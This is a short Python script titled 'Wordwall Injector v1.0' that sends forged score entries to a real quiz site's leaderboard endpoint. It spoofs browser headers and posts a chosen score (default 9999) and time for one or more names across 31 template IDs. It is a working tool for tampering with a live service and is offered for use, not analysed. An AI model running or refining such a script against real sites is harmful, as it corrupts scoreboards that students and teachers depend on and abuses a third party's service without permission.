import requests

banner1 = ''' 
█████   ███   █████                        █████                           ████  ████ 
░░███   ░███  ░░███                        ░░███                           ░░███ ░░███ 
 ░███   ░███   ░███   ██████  ████████   ███████  █████ ███ █████  ██████   ░███  ░███ 
 ░███   ░███   ░███  ███░░███░░███░░███ ███░░███ ░░███ ░███░░███  ░░░░░███  ░███  ░███ 
 ░░███  █████  ███  ░███ ░███ ░███ ░░░ ░███ ░███  ░███ ░███ ░███   ███████  ░███  ░███ 
  ░░░█████░█████░   ░███ ░███ ░███     ░███ ░███  ░░███████████   ███░░███  ░███  ░███ 
    ░░███ ░░███     ░░██████  █████    ░░████████  ░░████░████   ░░████████ █████ █████
     ░░░   ░░░       ░░░░░░  ░░░░░      ░░░░░░░░    ░░░░ ░░░░     ░░░░░░░░ ░░░░░ ░░░░░                                                   
'''

banner2 = '''
 █████                 ███                     █████                      
░░███                 ░░░                     ░░███                       
 ░███  ████████       █████  ██████   ██████  ███████    ██████  ████████ 
 ░███ ░░███░░███     ░░███  ███░░███ ███░░███░░░███░    ███░░███░░███░░███
 ░███  ░███ ░███      ░███ ░███████ ░███ ░░░   ░███    ░███ ░███ ░███ ░░░ 
 ░███  ░███ ░███      ░███ ░███░░░  ░███  ███  ░███ ███░███ ░███ ░███     
 █████ ████ █████     ░███ ░░██████ ░░██████   ░░█████ ░░██████  █████    
░░░░░ ░░░░ ░░░░░      ░███  ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░     
                  ███ ░███                                                
                 ░░██████                                                 
                  ░░░░░░                                                  
'''
banner3 = '''Welcome to the Wordwall Injector v1.0
By Green and Soverine
A basic tool for injectig wordwall scoreboards.
'''

headers = {
    "Host": "wordwall.net",
    "Cookie": "referrer2=%2C1",
    "Content-Length": "80",
    "Sec-Ch-Ua-Platform": "Windows",
    "X-Wordwall-Version": "1.0.0.0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://wordwall.net"
}

def payload(name, test_id, time="0", score="9999"):
    payload = {
    "score": score,
    "time": "0",
    "name": name,
    "mode": "1",
    "activityId": test_id,
    "templateId": "5"
    }

    for template in range(31):
        payload["templateId"] = template
        response = requests.post("https://wordwall.net/leaderboardajax/addentry", data=payload, headers=headers)
        print("Injecting Template: ", payload["templateId"])
        print("Status code:", response.status_code)
        print("Headers:", response.headers)
        print("Text:", response.text)
        print("-------------------------------------------------")


if __name__ == "__main__":
    print("\033[31m" + banner1, "\033[38;5;28m"  + banner2, "\033[94m" + banner3, "\033[38;5;252m")
    test_id = input("Test ID: ")
    name = input("User Name(Split with , for more users): ")
    time = input("Test Time(Default - 0): ")

    if time=="":
        time = "0"

    score = input("Score(Default - 9999): ")

    if score=="":
        score = "9999"

    names = name.split(",")

    if len(names)>1:
        for index, name in enumerate(names):
            print("Injectıon started for ", name)
            payload(name, test_id, str(int(time)+index), score)
    else:
        payload(name, test_id, time, score)
    print("Injection Completed!")⏎ 